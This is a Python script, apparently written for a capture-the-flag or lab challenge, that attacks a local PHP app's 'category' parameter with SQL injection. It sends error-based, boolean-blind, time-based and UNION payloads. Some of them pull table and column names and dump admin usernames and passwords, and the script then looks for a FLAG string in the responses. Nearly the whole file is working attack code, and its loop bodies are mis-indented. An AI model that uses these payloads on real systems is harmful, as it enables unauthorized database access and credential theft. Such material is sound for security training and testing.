import requests
import time

# Configuration
base_url = "http://127.0.0.1:33164/index.php"
headers = {"User-Agent": "Mozilla/5.0"}
cookies = {"PHPSESSID": "8993d695eb127fdc823416d1f8ee85ae"}

print("SQL Injection Testing - Category Parameter")
print("=" * 60)

# Establish baseline
print("\n[1] Establishing baseline...")
try:
    resp = requests.get(base_url, params={"category": "Nature"}, headers=headers, cookies=cookies, timeout=15)
    baseline_length = len(resp.text)
    baseline_status = resp.status_code
    print(f"Baseline response: Status={baseline_status}, Length={baseline_length}B")
except Exception as e:
    print(f"Error getting baseline: {e}")
    baseline_length = 0
    baseline_status = 0

# Test error-based injection
print("\n[2] Testing error-based SQL injection...")
error_tests = [
    "Nature' OR '1'='1--",
    "Nature' AND '1'='2--",
    "Tech' UNION SELECT 1,2,3,4,5--",
    "Science' UNION SELECT @@version--"
]

for payload in error_tests:
try:
    resp = requests.get(base_url, params={"category": payload}, headers=headers, cookies=cookies, timeout=15)
    print(f"  Payload: {payload}")
    status = resp.status_code
    length = len(resp.text)
    diff = length - baseline_length
    
    if "SQL" in resp.text.upper() or "error" in resp.text.lower() or "syntax" in resp.text.lower():
        print(f"    -> Status: {status}, Length: {length}B, Diff: {diff:+d}B")
        print(f"    -> POTENTIAL SQL ERROR DETECTED")
        print(f"    -> Snippet: {resp.text[:200]}")
    elif length > baseline_length + 100:
        print(f"    -> Status: {status}, Length: {length}B, Diff: {diff:+d}B")
        print(f"    -> SIGNIFICANT SIZE INCREASE - DATA EXTRACTED")
        print(f"    -> Snippet: {resp.text[:300]}")
    else:
        print(f"    -> Status: {status}, Length: {length}B, Diff: {diff:+d}B")
except Exception as e:
    print(f"    -> Error: {str(e)[:50]}")

# Test boolean-based blind injection
print("\n[3] Testing boolean-based blind injection...")
bool_tests = [
    ("Nature' AND 1=1--", "Nature' AND 1=2--"),
    ("Tech' OR 1=1--", "Tech' OR 1=2--")
]

for true_payload, false_payload in bool_tests:
try:
    # True condition
    resp_true = requests.get(base_url, params={"category": true_payload}, headers=headers, cookies=cookies, timeout=15)
    len_true = len(resp_true.text)
    
    # False condition
    resp_false = requests.get(base_url, params={"category": false_payload}, headers=headers, cookies=cookies, timeout=15)
    len_false = len(resp_false.text)
    
    print(f"  True:  {true_payload}")
    print(f"    -> Length: {len_true}B")
    print(f"  False: {false_payload}")
    print(f"    -> Length: {len_false}B")
    
    if len_true != len_false:
        print(f"  -> BOOLEAN INJECTION DETECTED! Difference: {abs(len_true - len_false)}B")
    else:
        print(f"  -> No difference")
except Exception as e:
    print(f"  -> Error: {str(e)[:50]}")

# Test time-based blind injection
print("\n[4] Testing time-based blind injection...")
time_tests = [
    "Nature' AND SLEEP(5)--",
    "Nature' AND pg_sleep(5)--",
    "Tech' UNION SELECT SLEEP(5)--"
]

for payload in time_tests:
try:
    start = time.time()
    resp = requests.get(base_url, params={"category": payload}, headers=headers, cookies=cookies, timeout=20)
    elapsed = time.time() - start
    
    print(f"  Payload: {payload}")
    print(f"    -> Time: {elapsed:.2f}s")
    
    if elapsed > 4.5:
        print(f"    -> TIME-BASED INJECTION DETECTED!")
    else:
        print(f"    -> No significant delay")
except requests.exceptions.Timeout:
    print(f"  Payload: {payload}")
    print(f"    -> TIMEOUT - possible time-based injection")
except Exception as e:
    print(f"    -> Error: {str(e)[:50]}")

# Test data extraction
print("\n[5] Testing data extraction...")
extraction_tests = [
    "Nature' UNION SELECT table_name FROM information_schema.tables LIMIT 5--",
    "Nature' UNION SELECT column_name FROM information_schema.columns WHERE table_name='admins' LIMIT 5--",
    "Nature' UNION SELECT concat(username,':',password) FROM admins LIMIT 5--",
    "Tech' UNION SELECT @@version, database(), user()--"
]

for payload in extraction_tests:
try:
    resp = requests.get(base_url, params={"category": payload}, headers=headers, cookies=cookies, timeout=15)
    status = resp.status_code
    length = len(resp.text)
    diff = length - baseline_length
    
    print(f"  Payload: {payload[:60]}...")
    print(f"    -> Status: {status}, Length: {length}B, Diff: {diff:+d}B")
    
    if length > baseline_length + 50:
        print(f"    -> DATA POTENTIALLY EXTRACTED")
        print(f"    -> Snippet: {resp.text[:400]}")
        
        # Check for credentials or flags
        if "admin" in resp.text.lower() or "password" in resp.text.lower():
            print(f"    -> POTENTIAL CREDENTIALS FOUND!")
        
        flag_match = resp.text.find("FLAG{")
        if flag_match != -1:
            flag_end = resp.text.find("}", flag_match)
            if flag_end != -1:
                flag = resp.text[flag_match:flag_end+1]
                print(f"    -> FLAG FOUND: {flag}")
except Exception as e:
    print(f"    -> Error: {str(e)[:50]}")

print("\n" + "=" * 60)
print("Testing complete. Review results above.")
print("\nLook for:")
print("- SQL error messages")
print("- Different responses between true/false conditions") 
print("- Time delays")
print("- Significant size increases")
print("- Extracted data/credentials")
print("- FLAG{...} patterns")
print("=" * 60)
